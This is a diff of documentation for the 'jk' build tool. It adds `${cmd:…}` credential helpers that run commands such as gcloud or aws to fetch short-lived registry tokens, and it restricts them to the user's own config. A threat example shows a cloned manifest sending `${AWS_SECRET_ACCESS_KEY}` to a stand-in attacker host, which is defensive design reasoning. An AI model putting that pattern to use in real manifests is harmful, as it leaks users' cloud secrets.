@@ -249,6 +249,7 @@ secret itself. jk expands it each time the repository is used:
 | `${NAME}` or `${env:NAME}` | the environment variable (`env:` is the explicit spelling) |
 | `${file:~/.secrets/nexus-token}` | the whole file, with its trailing newline trimmed |
 | `${file:~/.jk/secrets.properties#nexus.password}` | one key of a Java `.properties` file |
+| `${cmd:gcloud auth print-access-token}` | what a credential helper prints; see [Credential helpers](#credential-helpers) |
 
 ```toml
 # ~/.jk/config.toml
@@ -274,6 +275,42 @@ A `JK_REPO_<ID>_*_FILE` variable follows the same permission rule. Setting both
 `JK_REPO_<ID>_TOKEN` and `JK_REPO_<ID>_TOKEN_FILE` is an error. jk reads the `_FILE` variable from
 the shell that runs `jk`, never from a project's `.env`, so a cloned project can't choose which of
 your files a credential comes from. A relative path is relative to your home directory.
+
+### Credential helpers
+
+Cloud registries and vaults issue tokens that expire within the hour, so no file stays valid. A
+`${cmd:…}` reference runs a helper and uses what it prints:
+
+```toml
+# ~/.jk/config.toml — Google Artifact Registry
+[repositories.gar]
+url   = "https://us-maven.pkg.dev/acme/maven/"
+token = "${cmd:gcloud auth print-access-token}"
+
+# AWS CodeArtifact: a 12-hour token, reused for 30 minutes
+[repositories.codeartifact]
+url      = "https://acme-111122223333.d.codeartifact.us-east-1.amazonaws.com/maven/libs/"
+username = "aws"
+password = "${cmd:aws codeartifact get-authorization-token --domain acme --domain-owner 111122223333 --query authorizationToken --output text #ttl=30m}"
+```
+
+- jk splits the command into words the way it splits `[scripts]`, with single and double quotes,
+  and runs it without a shell. To use pipes or `$VAR` expansion, write `sh -c '…'` yourself.
+- The helper runs with the environment of the shell that ran `jk`, so `PATH`, `gcloud`'s active
+  account and `AWS_PROFILE` match your terminal, not the shell that started the engine. Its
+  working directory is your home, and its stdin is closed.
+- Its stdout, with surrounding whitespace trimmed, is the value. A non-zero exit, empty output, or
+  no answer within 10 seconds is an error that names `repositories.<id>.<key>`, the command and
+  the end of its stderr.
+- The engine reuses a helper's value for 15 minutes. Set a different time with a `#ttl=` suffix
+  (`s`, `m` or `h`) at the end of the command. The cache is keyed by the command and your
+  environment, and concurrent resolves share one run.
+- When the repository answers 401 or 403, jk drops the cached value, runs the helper once more,
+  and sends the request once more. A second refusal is the answer.
+- jk masks what the helper prints, as it masks every other credential.
+
+`${cmd:…}` works only in `~/.jk/config.toml`. Anywhere else it is a parse error, not a warning:
+a project that could name a command would run it on your machine at its first resolve.
 
 ### A name is not a destination
 
@@ -310,10 +347,10 @@ CI that exports `JK_REPO_INTERNAL_TOKEN` for a repository the project declares e
 
 An inline `${VAR}` reads your shell too, and which file wrote it decides whether it may:
 
-| Declared in | `${VAR}` may name | `${file:…}` |
-|-------------|-------------------|-------------|
-| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin | allowed |
-| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above | refused like a foreign variable; anywhere outside a repository's credential or object-store keys it is a parse error |
+| Declared in | `${VAR}` may name | `${file:…}` | `${cmd:…}` |
+|-------------|-------------------|-------------|------------|
+| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin | allowed | allowed |
+| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above | refused like a foreign variable; anywhere outside a repository's credential or object-store keys it is a parse error | a parse error |
 
 A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
 "https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
